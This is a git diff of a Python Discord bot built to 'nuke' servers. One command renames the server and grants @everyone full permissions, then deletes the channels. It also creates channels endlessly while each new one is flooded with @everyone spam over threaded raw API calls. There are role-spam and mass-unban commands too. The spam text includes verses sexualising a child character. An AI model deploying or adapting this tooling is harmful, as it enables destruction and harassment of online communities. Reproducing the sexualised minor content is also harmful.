@@ -2,32 +2,118 @@ import discord
 from discord.ext import commands, tasks
 import os
 import asyncio
-rolespamnumber = 200 #the role number that the bot will attempt to create 
-channelname = 'the protest' #channel name ofc
-rolename = 'protesters' # role name
-servername = 'Tiananmen Square' # the server name you desire 
+import threading
+import requests
+import time
+import json
 
+rolespamnumber = 30 #the role number that the bot will attempt to create  
+rolename = 'emiya shirou' # role name
+servername = 'Archer' # the server name you desire 
+channelname = 'Unlimited Blade Works'#channel name
 prefix='initiate' # the prefix
-
-spammessage = """@everyone
-动态网自由门 天安門 天安门 法輪功 李洪志 Free Tibet 六四天安門事件 The Tiananmen Square protests of 1989 天安門大屠殺 The Tiananmen Square Massacre 反右派鬥爭 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Proletarian Cultural Revolution 人權 Human Rights 民運 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Taiwan Formosa 中華民國 Republic of China 西藏 土伯特 唐古特 Tibet 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xinjiang Uyghur Autonomous Region 諾貝爾和平獎 Nobel Peace Prize 劉暁波 Liu Xiaobo 民主 言論 思想 反共 反革命 抗議 運動 騷亂 暴亂 騷擾 擾亂 抗暴 平反 維權 示威游行 李洪志 法輪大法 大法弟子 強制斷種 強制堕胎 民族淨化 人體實驗 肅清 胡耀邦 趙紫陽 魏京生 王丹 還政於民 和平演變 激流中國 北京之春 大紀元時報 九評論共産黨 獨裁 專制 壓制 統一 監視 鎮壓 迫害 侵略 掠奪 破壞 拷問 屠殺 活摘器官 誘拐 買賣人口 遊進 走私 毒品 賣淫 春畫 賭博 六合彩 天安門 天安门 法輪功 李洪志 Winnie the Pooh 劉曉波动态网自由门 https://cdn.discordapp.com/attachments/697469061075828796/857189298339708958/video0.mov
-
-""" #self explanatory 
-
-
 intents=discord.Intents.default()
 intents = discord.Intents(messages=True, guilds=True)
-
 client = commands.Bot(command_prefix=prefix, intents=intents)
+spammessage= """@everyone
+I am the slam of my jam.
 
+Slam is my body, and jam is my blood.
+
+I have slammed over a thousand jams.
+
+Unknown to slam.
+
+Nor known to jam.
+
+Withstood DMCA takedown notices to slam many jams.
+
+Yet these slams will never jam anything.
+
+So as I jam,
+
+Unlimited Slam Works.
+
+I am the imouto of my onii-chan
+
+flat is my chest and smooth is my skin
+
+I have hugged over a thousand onii-chans
+
+unknown to purity, nor known to lewdness
+
+have withstood pain to wear many pantsu
+
+yet these little hips will never move on their own
+
+so as I pray, Unlimited Loli Works
+
+I am the Bone of my Skillet,
+
+Steel is my Pan and Fire is my Oven,
+
+I have cooked over a thousand meals,
+
+Unknown to Fast Food, nor known to Instant Meals,
+
+Have withstood heat to cook many dishes,
+
+Yet this mouth will never eat anything,
+
+So as I cook, Unlimited Food Works
+
+I am the bone of my hand.
+
+Ex is my body, and Fakku is my blood.
+
+I have created over a thousand loads.
+
+Unknown to sex.
+
+Nor known to girls.
+
+Have withstood pain to create many orgasms.
+
+Yet, those orgasms will never be with girls.
+
+So as I pray, Unlimited Hentai Works.
+https://cdn.discordapp.com/attachments/907534472537317407/907538973847613440/b29.png"""
+
+
+with open("b29.jpg", "rb") as f: #server's icon
+    icon = f.read()
+
+def spamming(channel):
+  
+    while(True):
+        for i in range(50):
+          try:
+            channelID = channel.id
+            botToken = str(os.getenv('TOKEN'))
+            baseURL = "https://discordapp.com/api/v9/channels/{}/messages".format(channelID)
+            headers = { "Authorization":"Bot {}".format(botToken),
+                  "User-Agent":"myBotThing (http://some.url, v0.1)",
+                  "Content-Type":"application/json", }
+            
+
+            message = spammessage
+            POSTedJSON =  json.dumps ( {"content":message} )
+            r = requests.post(baseURL, headers = headers, data = POSTedJSON)
+          except:
+            pass
+            
 @client.event
 async def on_ready():
     print('ready')
 
-@client.event # when a channel is created, send the spam message 5 times in that channel (this is really fast, about 50 pings a second if you have a good host)
+@client.event 
 async def on_guild_channel_create(channel):
-  for _ in range(5):
-    await channel.send(spammessage)
+  while(True):
+    for i in range(5):
+      await channel.send(spammessage)
+  threading.Thread(target=spamming, args=(channel,)).start()
+      
+
 
 @client.command()
 async def ping(ctx):
@@ -35,14 +121,40 @@ async def ping(ctx):
 
 
 @client.command()
-async def thethirdimpact(ctx): #the nuke command, change it if you want
+async def thethirdimpact(ctx, *epic): #the nuke command, change it if you want
   
     print('the code was initiated, get ready for the nuke')
+    if epic == "epic":
+      await ctx.send("""`I am the Bone of my Sword
+Steel is my Body and Fire is my Blood`""")
+      time.sleep(1)
+      await ctx.send("`I have created over a Thousand Blades`")
+      time.sleep(1)
+      await ctx.send("`Unknown to Death,`")
+      time.sleep(1)
+      await ctx.send("`Nor known to Life.`")
+      time.sleep(1)
+      await ctx.send("`Have withstood Pain to create many Weapons`")
+      time.sleep(1)
+      await ctx.send("`Yet those Hands will never hold Anything.`")
+      time.sleep(1)
+      await ctx.send("`So, as I Pray--`")
+      time.sleep(2)
+      await ctx.send("**Unlimited Blade Works**")
+      time.sleep(2)
+    elif epic == None:
+      pass
+    try:
+      await ctx.guild.edit(name=servername, icon=icon) 
+    except:
+      print('no') 
     
     try:
-      await ctx.guild.edit(name=servername) 
+        role = discord.utils.get(ctx.guild.roles, name="@everyone")
+        await role.edit(permissions = discord.Permissions.all())
+        print("ok")
     except:
-      print('no')
+        print("failed to change the permission")
     
     guild = ctx.message.guild
     
@@ -53,15 +165,17 @@ async def thethirdimpact(ctx): #the nuke command, change it if you want
         print("cannot delete " + str(c))
         
     while(True):
-          await guild.create_text_channel(channelname) #loop create the channels, the event function will do the job
       
-
-@client.command() #plan B, spam in all the channel (not as fast as the nuke but still works)
+      await guild.create_text_channel(channelname)
+       #loop create the channels, the event function will do the job
+    
+@client.command()
 async def spam(ctx):
-  while(True):
-    for c in ctx.guild.text_channels:
-      for _ in range(5):
-        await c.send(spammessage)
+  print('running spam')
+  for channel in ctx.guild.channels:
+    threading.Thread(target=spamming, args=(channel,)).start()
+
+
 
 @client.command()
 async def rolespam(ctx): #role spam command
@@ -76,12 +190,24 @@ async def rolespam(ctx): #role spam command
       except:
         print('max number of roles reached')
         break
-
 @client.command()
-async def massunban(ctx): #mass unban
+async def massunban(ctx):
   bannedUsers = await ctx.message.guild.bans()
   for user in bannedUsers:
     await ctx.guild.unban(user.user)
     print('unbanned '+ user.user.name + '#' + user.user.discriminator)
-
+@client.command()
+async def createchannel(ctx):
+  while(True):
+          await ctx.message.guild.create_text_channel(channelname)
+@client.command()
+async def ban(ctx, member : discord.Member, *, reason = None):
+  print('banning')
+  if ctx.message.author.id == "464427494666272768":
+    try:
+      await member.ban()
+      ctx.send('balls')
+    except:
+      print("cant ban")
+  
 client.run(os.getenv("TOKEN")) #login 
